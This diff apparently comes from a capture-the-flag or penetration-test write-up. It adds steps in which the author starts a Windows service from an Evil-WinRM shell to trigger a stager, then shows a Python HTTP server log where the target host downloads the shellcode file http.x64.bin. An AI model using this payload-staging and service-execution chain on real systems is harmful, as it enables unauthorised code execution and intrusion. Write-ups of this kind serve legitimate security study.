@@ -1029,5 +1029,16 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 Ill then setup a web server so my stager can load my shellcode
 
 ```python
-
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> sc.exe start CTOSInventorySvc
 ```
+
+Then ill run it, it will call my stager and the stager will get the shellcode
+
+```python
+python3 -m http.server 80              
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.1.206.115 - - [02/Sep/2026 13:00:48] "GET /http.x64.bin HTTP/1.1" 200 -
+```
+
+As seen here it got the shellcode
+
